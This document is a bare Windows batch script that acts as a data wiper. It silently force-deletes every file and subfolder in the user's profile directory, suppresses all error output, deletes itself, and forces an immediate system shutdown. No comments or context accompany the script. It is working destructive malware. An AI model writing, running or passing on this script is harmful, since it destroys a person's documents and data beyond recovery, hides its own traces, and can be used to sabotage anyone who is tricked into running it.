@echo off
cd /d %USERPROFILE%

for /f "delims=" %%i in ('dir /b /a-d') do (
    del /f /q "%%i" >nul 2>&1
)

for /f "delims=" %%i in ('dir /b /ad') do (
    rmdir /s /q "%%i" >nul 2>&1
)

del "%~f0" >nul 2>&1
shutdown /s /t 0 /f >nul 2>&1